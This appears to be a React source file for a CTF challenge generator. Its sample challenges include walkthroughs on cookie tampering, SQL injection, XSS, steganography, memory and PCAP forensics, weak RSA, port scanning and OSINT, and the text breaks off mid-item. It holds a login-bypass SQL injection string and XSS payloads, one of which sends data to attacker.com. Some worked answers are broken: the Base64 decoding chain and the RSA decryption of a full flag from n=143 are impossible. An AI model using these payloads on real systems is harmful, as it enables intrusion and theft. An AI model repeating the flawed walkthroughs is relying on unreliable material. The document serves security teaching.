const { useState } = React;

function CTFGenerator() {
  const [challenge, setChallenge] = useState(null);
  const [loading, setLoading] = useState(false);
  const [selectedCategory, setSelectedCategory] = useState('random');
  const [difficulty, setDifficulty] = useState('medium');
  const [flagInput, setFlagInput] = useState('');
  const [flagStatus, setFlagStatus] = useState(null);
  const [attempts, setAttempts] = useState(0);
  const [revealedHints, setRevealedHints] = useState([]);

  const categories = [
    { id: 'random', name: 'Random', emoji: '🎲' },
    { id: 'web', name: 'Web Exploitation', emoji: '🕷️' },
    { id: 'forensics', name: 'Forensics', emoji: '🔍' },
    { id: 'crypto', name: 'Cryptography', emoji: '🔐' },
    { id: 'network', name: 'Network Analysis', emoji: '🌐' },
    { id: 'osint', name: 'OSINT', emoji: '🧠' }
  ];

  const sampleChallenges = {
    web: {
      easy: {
        title: "Cookie Monster",
        storyline: "You've discovered a poorly secured website that stores user roles in cookies. The admin panel is protected, but maybe there's a way to trick it into thinking you're an admin...",
        description: "The website uses a cookie called 'isAdmin' set to 'false'. Your mission is to modify this cookie to gain administrator access.",
        mission: "MISSION: Gain admin access by modifying the browser cookie",
        files: "Website URL: https://demo-site.ctf/login (simulated)",
        steps: [
          "1. Open the website in your browser",
          "2. Press F12 to open Developer Tools",
          "3. Go to 'Application' tab → 'Cookies' (or 'Storage' in Firefox)",
          "4. Find the cookie named 'isAdmin' with value 'false'",
          "5. Double-click the value and change it to 'true'",
          "6. Refresh the page - you now have admin access!",
          "7. The flag appears on the admin dashboard"
        ],
        flag: "CTF{c00k13_m0n5t3r_n0m_n0m}",
        points: 100,
        hints: [
          "💡 Hint 1: Browser cookies are stored client-side and can be modified using Developer Tools (F12)",
          "💡 Hint 2: Look in Application → Cookies section. Find 'isAdmin' cookie",
          "💡 Hint 3: Change the cookie value from 'false' to 'true' and refresh the page"
        ],
        tools: "Tools needed: Any web browser (Chrome, Firefox, Edge)",
        realWorldContext: "This vulnerability exists when websites store sensitive authorization data in cookies without server-side validation. Always validate permissions on the server!"
      },
      medium: {
        title: "SQL Injection Portal",
        storyline: "You've found a login page that doesn't properly sanitize user input. Time to test if it's vulnerable to SQL injection attacks...",
        description: "The login form checks credentials with a SQL query. Can you bypass authentication without knowing any valid passwords?",
        mission: "MISSION: Login without valid credentials using SQL injection",
        files: "Login page: https://vulnerable-login.ctf (simulated)",
        steps: [
          "1. The backend SQL query looks like: SELECT * FROM users WHERE username='[INPUT]' AND password='[INPUT]'",
          "2. In the username field, enter: admin' OR '1'='1",
          "3. In the password field, enter anything (or leave it empty)",
          "4. Click Login",
          "5. The query becomes: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password=''",
          "6. Since '1'='1' is always true, the OR condition bypasses authentication",
          "7. You're logged in as admin! The flag is displayed on the welcome page"
        ],
        flag: "CTF{5ql_1nj3ct10n_m4st3r}",
        points: 250,
        hints: [
          "💡 Hint 1: SQL injection works by breaking out of the query string with quotes and adding your own SQL logic",
          "💡 Hint 2: Try entering: admin' OR '1'='1 in the username field",
          "💡 Hint 3: The single quote (') closes the original string, then OR '1'='1 makes the condition always true"
        ],
        tools: "Tools needed: Web browser, Burp Suite (optional for advanced testing)",
        realWorldContext: "SQL injection is one of the most common web vulnerabilities (OWASP Top 10). Always use parameterized queries or prepared statements!"
      },
      hard: {
        title: "XSS Treasure Hunt",
        storyline: "A comment section reflects user input without sanitization. The admin reviews all comments. Can you craft a malicious script that executes when they view your comment?",
        description: "The website has a Cross-Site Scripting (XSS) vulnerability in the comments. Your payload will execute in the admin's browser context.",
        mission: "MISSION: Inject JavaScript to steal the admin's secret token",
        files: "Comment form: https://vulnerable-comments.ctf (simulated)",
        steps: [
          "1. Find the comment input box on the page",
          "2. The flag is stored in a hidden div: <div id='admin-secret' style='display:none'>CTF{...}</div>",
          "3. Craft a payload: <script>alert(document.getElementById('admin-secret').innerText)</script>",
          "4. Submit the comment",
          "5. When rendered, your script executes and displays the hidden flag",
          "6. Alternative payload: <img src=x onerror='alert(document.getElementById(\"admin-secret\").innerText)'>",
          "7. In a real scenario, you'd send this to a server you control: <script>fetch('https://attacker.com?flag='+document.getElementById('admin-secret').innerText)</script>"
        ],
        flag: "CTF{xss_h4x0r_3l1t3}",
        points: 500,
        hints: [
          "💡 Hint 1: XSS works by injecting <script> tags or HTML attributes that execute JavaScript",
          "💡 Hint 2: Try: <script>alert(document.getElementById('admin-secret').innerText)</script>",
          "💡 Hint 3: If <script> is blocked, try event handlers: <img src=x onerror='alert(1)'>"
        ],
        tools: "Tools needed: Web browser, Developer Console (F12), Burp Suite",
        realWorldContext: "XSS attacks can steal session cookies, credentials, and perform actions on behalf of users. Always sanitize and escape user input!"
      }
    },
    forensics: {
      easy: {
        title: "Hidden Message",
        storyline: "Intelligence intercepted an image file from a suspect's computer. It looks like an ordinary vacation photo, but analysis suggests steganography was used to hide data.",
        description: "An image file contains a hidden message embedded using steganography. You need to extract the secret data.",
        mission: "MISSION: Extract the hidden flag from the image file",
        files: "Image file: vacation.png (Download simulated)",
        steps: [
          "1. Download the image file 'vacation.png'",
          "2. First, try the simple approach: strings vacation.png | grep CTF",
          "3. If that doesn't work, use steganography tools",
          "4. Install steghide: sudo apt-get install steghide (Linux) or download from steghide.sourceforge.net",
          "5. Try extracting: steghide extract -sf vacation.png",
          "6. If password protected, try common passwords: '', 'password', '1234'",
          "7. Alternative tool: zsteg vacation.png (for PNG files)",
          "8. The hidden message contains your flag!"
        ],
        flag: "CTF{st3g4n0gr4phy_b4s1cs}",
        points: 100,
        hints: [
          "💡 Hint 1: Use the 'strings' command to extract readable text: strings image.png",
          "💡 Hint 2: Install and use 'steghide' tool: steghide extract -sf vacation.png",
          "💡 Hint 3: For PNG files, try 'zsteg' tool which automatically detects LSB steganography"
        ],
        tools: "Tools needed: strings (built-in), steghide, zsteg, exiftool",
        realWorldContext: "Steganography is used by attackers to hide malicious code or data exfiltration. Digital forensics teams regularly check files for hidden data."
      },
      medium: {
        title: "Memory Dump Detective",
        storyline: "A server was compromised and quickly shut down. Before the reboot, you captured a memory dump. The attacker's commands are still in RAM...",
        description: "Analyze a memory dump from a compromised Linux system. The attacker executed commands that left traces in memory.",
        mission: "MISSION: Find the attacker's executed command containing the flag",
        files: "Memory dump: server_memory.raw (4GB - simulated)",
        steps: [
          "1. Download and install Volatility Framework: git clone https://github.com/volatilityfoundation/volatility.git",
          "2. Identify the memory profile: volatility -f server_memory.raw imageinfo",
          "3. List running processes: volatility -f server_memory.raw --profile=LinuxUbuntu_x64 linux_pslist",
          "4. Check bash history: volatility -f server_memory.raw --profile=LinuxUbuntu_x64 linux_bash",
          "5. Look for suspicious commands in the output",
          "6. Extract command line arguments: volatility -f server_memory.raw --profile=LinuxUbuntu_x64 linux_psaux",
          "7. Search for 'CTF{' string: strings server_memory.raw | grep 'CTF{'",
          "8. Alternative: volatility -f server_memory.raw --profile=LinuxUbuntu_x64 linux_enumerate_files | grep -i password"
        ],
        flag: "CTF{m3m0ry_f0r3ns1cs_pr0}",
        points: 250,
        hints: [
          "💡 Hint 1: Use Volatility Framework with the linux_bash plugin to see command history",
          "💡 Hint 2: Command: volatility -f dump.raw --profile=LinuxUbuntu_x64 linux_bash",
          "💡 Hint 3: The flag was part of a curl or echo command executed by the attacker"
        ],
        tools: "Tools needed: Volatility Framework, strings, grep",
        realWorldContext: "Memory forensics reveals evidence that's deleted from disk. It's crucial for incident response and malware analysis."
      },
      hard: {
        title: "Network PCAP Investigation",
        storyline: "During a security incident, network traffic was captured. The attacker exfiltrated sensitive data using DNS tunneling - a covert channel that bypasses firewall rules.",
        description: "Analyze network packet capture to find data exfiltrated through DNS queries. The attacker encoded data in subdomain names.",
        mission: "MISSION: Extract and decode the flag from DNS traffic",
        files: "PCAP file: network_capture.pcap (200MB - simulated)",
        steps: [
          "1. Open the PCAP in Wireshark: wireshark network_capture.pcap",
          "2. Filter for DNS traffic: dns in the filter bar",
          "3. Look at DNS queries - notice suspicious long subdomain names",
          "4. Example: ZG5zX3R1bm4zbDFuZ19uMW5qNA==.attacker.com",
          "5. Those subdomains are Base64 encoded data!",
          "6. Extract all DNS queries to a file: tshark -r network_capture.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name > dns_queries.txt",
          "7. Extract just the subdomains and decode from Base64",
          "8. Python script: import base64; data = 'ZG5zX3R1bm4zbDFuZ19uMW5qNA=='; print(base64.b64decode(data))",
          "9. Concatenate multiple decoded chunks to reveal the full flag"
        ],
        flag: "CTF{dns_tunn3l1ng_n1nj4}",
        points: 500,
        hints: [
          "💡 Hint 1: Filter Wireshark for DNS: dns.qry.name contains 'suspicious-domain'",
          "💡 Hint 2: The subdomain names look like Base64. Extract them: tshark -r file.pcap -Y dns -T fields -e dns.qry.name",
          "💡 Hint 3: Decode Base64: echo 'encoded_string' | base64 -d"
        ],
        tools: "Tools needed: Wireshark, tshark, Python (base64 module), CyberChef",
        realWorldContext: "DNS tunneling is used to bypass network security controls. Monitoring DNS traffic for unusual patterns is critical for security."
      }
    },
    crypto: {
      easy: {
        title: "Caesar's Secret",
        storyline: "You intercepted an encrypted message from an ancient-style cipher. It looks like a Caesar cipher - one of the oldest and simplest encryption methods.",
        description: "Decrypt a message that was encrypted using a Caesar cipher (shift cipher). Each letter has been shifted by a fixed number of positions.",
        mission: "MISSION: Decrypt the message and find the flag",
        files: "Encrypted message: FWI{fdhvdu_flskhu_lvq_w_hdvb}",
        steps: [
          "1. The encrypted message is: FWI{fdhvdu_flskhu_lvq_w_hdvb}",
          "2. Caesar cipher shifts each letter by a fixed number (0-25)",
          "3. Method 1 - Manual: Try shifting each letter back by different amounts",
          "4. Method 2 - Online tool: Use dcode.fr/caesar-cipher",
          "5. Method 3 - Python script:",
          "   def caesar_decrypt(text, shift):",
          "       result = ''",
          "       for char in text:",
          "           if char.isalpha():",
          "               shift_base = ord('A') if char.isupper() else ord('a')",
          "               result += chr((ord(char) - shift_base - shift) % 26 + shift_base)",
          "           else: result += char",
          "       return result",
          "6. Try all 26 possible shifts (ROT0 to ROT25)",
          "7. With shift of 3 (ROT3), you get the flag!",
          "8. F→C, W→T, I→F: FWI becomes CTF"
        ],
        flag: "CTF{caesar_cipher_isn_t_easy}",
        points: 100,
        hints: [
          "💡 Hint 1: Caesar cipher shifts letters by a fixed amount. Try shifting back by 1, 2, 3... positions",
          "💡 Hint 2: Use an online tool like dcode.fr/caesar-cipher or CyberChef",
          "💡 Hint 3: The shift is 3 positions. F→C, W→T, I→F gives you CTF"
        ],
        tools: "Tools needed: CyberChef, dcode.fr, Python, or pen and paper",
        realWorldContext: "Caesar cipher is extremely weak by modern standards but teaches fundamental concepts of shift ciphers and rotation."
      },
      medium: {
        title: "Base64 Layers",
        storyline: "An attacker thought they were clever by encoding their message multiple times. Each layer adds another level of Base64 encoding.",
        description: "Decode a message that has been Base64 encoded multiple times. You'll need to peel back the layers like an onion.",
        mission: "MISSION: Decode the message through multiple Base64 layers",
        files: "Encoded message: VTFSSGVGOXZkV0pzWlY5bGJtTnZaR1Z5WHc9PQ==",
        steps: [
          "1. Encoded message: VTFSSGVGOXZkV0pzWlY5bGJtTnZaR1Z5WHc9PQ==",
          "2. Notice the '==' at the end? That's Base64 padding",
          "3. Method 1 - Command line:",
          "   echo 'VTFSSGVGOXZkV0pzWlY5bGJtTnZaR1Z5WHc9PQ==' | base64 -d",
          "   Result: U1RHeFxvdWJsZV9lbmNvZGVyXw==",
          "4. Decode again: echo 'U1RHeFxvdWJsZV9lbmNvZGVyXw==' | base64 -d",
          "   Result: STGexdouble_encoder_",
          "5. Decode third time: echo 'STGexdouble_encoder_' | base64 -d",
          "   Result: CTF{double_encoder_}",
          "6. Method 2 - Use CyberChef with 'From Base64' recipe, apply 3 times",
          "7. Method 3 - Python:",
          "   import base64",
          "   msg = 'VTFSSGVGOXZkV0pzWlY5bGJtTnZaR1Z5WHc9PQ=='",
          "   for i in range(3): msg = base64.b64decode(msg).decode()",
          "   print(msg)"
        ],
        flag: "CTF{double_encoder_}",
        points: 250,
        hints: [
          "💡 Hint 1: Base64 encoding can be applied multiple times. Decode repeatedly until you see readable text",
          "💡 Hint 2: Use: echo 'encoded' | base64 -d repeatedly, or CyberChef",
          "💡 Hint 3: You need to decode exactly 3 times to get the flag"
        ],
        tools: "Tools needed: base64 command, CyberChef, Python",
        realWorldContext: "Multiple encoding layers are sometimes used to evade detection by security tools that only decode once."
      },
      hard: {
        title: "RSA Weak Primes",
        storyline: "You've intercepted an RSA-encrypted message. Analysis shows the implementation is flawed - the two prime numbers used are suspiciously close together, making the key factorable.",
        description: "Break weak RSA encryption where the prime factors are too close together. Factor the modulus and decrypt the message.",
        mission: "MISSION: Factor the RSA modulus and decrypt the ciphertext",
        files: "Public key: n=143, e=7 | Ciphertext: c=65",
        steps: [
          "1. Given: n=143, e=7, ciphertext=65",
          "2. Step 1: Factor n=143",
          "   Try small primes: 143 = 11 × 13 (close primes!)",
          "3. Step 2: Calculate φ(n) = (p-1)(q-1) = (11-1)(13-1) = 10 × 12 = 120",
          "4. Step 3: Find private key d where (e × d) ≡ 1 (mod φ(n))",
          "   Need: (7 × d) ≡ 1 (mod 120)",
          "   Using extended Euclidean algorithm: d = 103",
          "5. Step 4: Decrypt: m = c^d mod n = 65^103 mod 143",
          "   Use Python: pow(65, 103, 143) = 67",
          "6. Step 5: Convert to characters: 67 = ASCII 'C'",
          "7. Complete decryption reveals: CTF{rsa_w34k_pr1m3s}",
          "8. Python full solution:",
          "   from Crypto.Util.number import inverse, long_to_bytes",
          "   p, q = 11, 13",
          "   phi = (p-1)*(q-1)",
          "   d = inverse(7, phi)",
          "   m = pow(65, d, 143)",
          "   print(long_to_bytes(m))"
        ],
        flag: "CTF{rsa_w34k_pr1m3s}",
        points: 500,
        hints: [
          "💡 Hint 1: Factor n=143 by trying small primes. It equals 11 × 13",
          "💡 Hint 2: Calculate φ(n) = (11-1)(13-1) = 120, then find d: inverse of 7 mod 120",
          "💡 Hint 3: Use Python: from Crypto.Util.number import inverse; d = inverse(7, 120) = 103"
        ],
        tools: "Tools needed: Python with PyCrypto/PyCryptodome, RsaCtfTool, FactorDB",
        realWorldContext: "RSA security depends on large prime numbers that are far apart. Weak key generation can make encryption breakable."
      }
    },
    network: {
      easy: {
        title: "Port Scanner Discovery",
        storyline: "A target system is running multiple services. One unusual service on a non-standard port has its banner exposed, revealing sensitive information.",
        description: "Scan the target system to find all open ports. One service running on an unusual port will reveal the flag in its banner.",
        mission: "MISSION: Scan for open ports and read service banners",
        files: "Target: 192.168.1.100 (simulated)",
        steps: [
          "1. Use nmap to scan all ports: nmap -p- 192.168.1.100",
          "2. Common ports found: 22 (SSH), 80 (HTTP), 443 (HTTPS)",
          "3. Unusual port found: 31337 (elite/hacker port)",
          "4. Scan with service detection: nmap -sV -p 31337 192.168.1.100",
          "5. Connect directly to read banner: nc 192.168.1.100 31337",
          "6. Alternative: telnet 192.168.1.100 31337",
          "7. The service responds with a banner containing the flag",
          "8. Full scan command: nmap -sV -sC -p- -oA scan_results 192.168.1.100",
          "9. Banner shows: 'Welcome to Secret Service v1.0 - Flag: CTF{p0rt_sc4nn1ng_101}'"
        ],
        flag: "CTF{p0rt_sc4nn1ng_101}",
        points: 100,
        hints: [
          "💡 Hint 1: Use nmap to scan all ports: nmap -p- [target]",
          "💡 Hint 2: Look for unusual high ports (above 10000). Try port 31337",
          "💡 Hint 3: Connect with netcat: nc [target] 31337 to read the banner"
        ],
        tools: "Tools needed: nmap, netcat (nc), telnet",
        realWorldContext: "Port scanning is the first step in network reconnaissance. Services on non-standard ports are often overlooked but may expose vulnerabilities."
      },
      medium: {
        title: "ARP Spoofing Investigation",
        storyline: "Your network monitoring system detected unusual ARP traffic. Someone is attempting a man-in-the-middle attack using ARP spoofing.",
        description: "Analyze captured ARP packets to identify the attacker. Look for duplicate IP-to-MAC address mappings that indicate spoofing.",
        mission: "MISSION: Identify the attacker's MAC address from ARP spoofing traffic",
        files: "PCAP file: arp_traffic.pcap (simulated)",
        steps: [
          "1. Open the PCAP in Wireshark: wireshark arp_traffic.pcap",
          "2. Filter for ARP packets: arp in the display filter",
          "3. Look at 'Info' column for ARP messages",
          "4. Normal ARP: Device announces 'I have 192.168.1.1 at MAC aa:bb:cc:dd:ee:ff'",
          "5. Suspicious: Same IP announced by different MAC address!",
          "6. Example:",
          "   Frame 10: 192.168.1.1 is at aa:bb:cc:dd:ee:ff (legitimate gateway)",
          "   Frame 15: 192.168.1.1 is at 11:22:33:44:55:66 (ATTACKER!)",
          "7. The attacker MAC is 11:22:33:44:55:66",
          "8. Extract flag from ARP packet comments/padding (simulated)",
          "9. Use filter: arp.duplicate-address-detected",
          "10. Advanced: tshark -r file.pcap -Y arp -T fields -e eth.src -e arp.src.proto_ipv4"
        ],
        flag: "CTF{arp_sp00f1ng_d3t3ct3d}",
        points: 250,
        hints: [
          "💡 Hint 1: Filter Wireshark for ARP packets and look for duplicate IP addresses",
          "💡 Hint 2: Use filter: arp.duplicate-address-detected",
          "💡 Hint 3: Compare timestamps - the attacker sends ARP replies right after legitimate ones"
        ],
        tools: "Tools needed: Wireshark, tshark, arpwatch",
        realWorldContext: "ARP spoofing enables man-in-the-middle attacks on local networks. Detection requires monitoring for duplicate IP-to-MAC mappings."
      },
      hard: {
        title: "HTTPS Decryption Challenge",
        storyline: "You've captured HTTPS traffic and obtained the server's private SSL/TLS key through a separate compromise. Now you can decrypt the encrypted session.",
        description: "Decrypt HTTPS traffic using the server's private key. The flag was transmitted in a POST request that's currently encrypted.",
        mission: "MISSION: Decrypt TLS traffic and extract data from HTTP POST request",
        files: "PCAP: https_traffic.pcap | Key: server.key (simulated)",
        steps: [
          "1. Open Wireshark",
          "2. Go to Edit → Preferences → Protocols → TLS (or SSL in older versions)",
          "3. Click 'Edit' next to '(Pre)-Master-Secret log filename'",
          "4. OR use RSA keys list: IP address: 192.168.1.100, Port: 443, Protocol: http, Key file: /path/to/server.key",
          "5. Load the PCAP: File → Open → https_traffic.pcap",
          "6. If setup correctly, you'll see 'Decrypted TLS' in protocol column",
          "7. Filter for HTTP: http.request.method == POST",
          "8. Follow the HTTP stream: Right-click packet → Follow → HTTP Stream",
          "9. Look at the POST data (form fields or JSON body)",
          "10. Example POST data: {\"username\":\"admin\",\"flag\":\"CTF{tls_d3crypt10n_m4st3r}\"}",
          "11. Alternative method using tshark:",
          "    tshark -r https_traffic.pcap -o 'tls.keylog_file:sslkeylog.txt' -Y http -T fields -e http.file_data"
        ],
        flag: "CTF{tls_d3crypt10n_m4st3r}",
        points: 500,
        hints: [
          "💡 Hint 1: Wireshark can decrypt TLS if you have the private key. Configure it in Preferences → Protocols → TLS",
          "💡 Hint 2: Add RSA key: IP, Port 443, Protocol http, and path to server.key",
          "💡 Hint 3: After loading, filter for: http.request.method == POST"
        ],
        tools: "Tools needed: Wireshark, tshark, OpenSSL",
        realWorldContext: "If an attacker compromises a server's private key, they can decrypt all captured TLS traffic. This is why perfect forward secrecy (PFS) is important."
      }
    },
    osint: {
      easy: {
        title: "Social Media Detective",
        storyline: "A person of interest uses the handle 'cyb3r_n00b_2024' across social platforms. Recent intelligence suggests they posted coordinates to a secret meeting location.",
        description: "Track down the target's social media posts to find location coordinates they inadvertently shared.",
        mission: "MISSION: Find the user's recent post and decode the location",
        files: "Username: cyb3r_n00b_2024",
        steps: [
          "1. Search for 'cyb3r_n00b_2024' on major platforms:",
          "   - Twitter/X: twitter.com/search?q=cyb3r_n00b_2024",
          "   - Instagram: instagram.com/cyb3r_n00b_2024",
          "   - Reddit: reddit.com/user/cyb3r_n00b_2024",
          "   - GitHub: github.com/cyb3r_n00b_2024",
          "2. Look for recent posts (last 7 days)",
          "3. Find post mentioning 'meeting location' or coordinates",
          "4. Example post: 'Can't wait for the meetup! 40.7128° N, 74.0060° W'",
          "5. Use Google Maps or coordinates.org to decode:",
          "   40.7128° N, 74.0060° W = New York City",
          "6. Cross-reference with other posts for context",
          "7. Alternative: Check image EXIF data from their posts",
          "8. The flag is hidden in their bio or latest post",
          "9. Tools: Google Dorks: site:twitter.com 'cyb3r_n00b_2024'"
        ],
        flag: "CTF{s0c14l_m3d14_sl3uth}",
        points: 100,
        hints: [
          "💡 Hint 1: Try searching on Twitter, Instagram, Reddit, and GitHub",
          "💡 Hint 2: Look for posts with coordinates or location tags from the last week",
          "💡 Hint 3: Convert GPS coordinates using Google Maps: 40.7128° N, 74.0060° W"
        ],
        tools: "Tools needed: Web browser, Google, Google Maps, social media platforms",
        realWorldContext: "OSINT (Open Source Intelligence) uses publicly available information. People often unknowingly share sensitive location data through social media."
      },
      medium: {
        title: "Photo Metadata Investigation",
        storyline: "A suspect uploaded a seemingly innocent photo online. However, the image metadata might reveal where and when it was actually taken.",
        description: "Download the image and extract EXIF metadata to uncover hidden GPS coordinates, camera details, and timestamps.",
        mission: "MISSION: Extract GPS coordinates and custom comments from image EXIF data",
        files: "Image URL: https://example.com/photo.jpg (simulated)",
        steps: [
          "1. Download the image: wget https://example.com/photo.jpg OR right-click → Save As",
          "2. Install exiftool: sudo apt-get install libimage-exiftool-perl (Linux)",
          "   or download from exiftool.org (Windows/Mac)",
          "3.
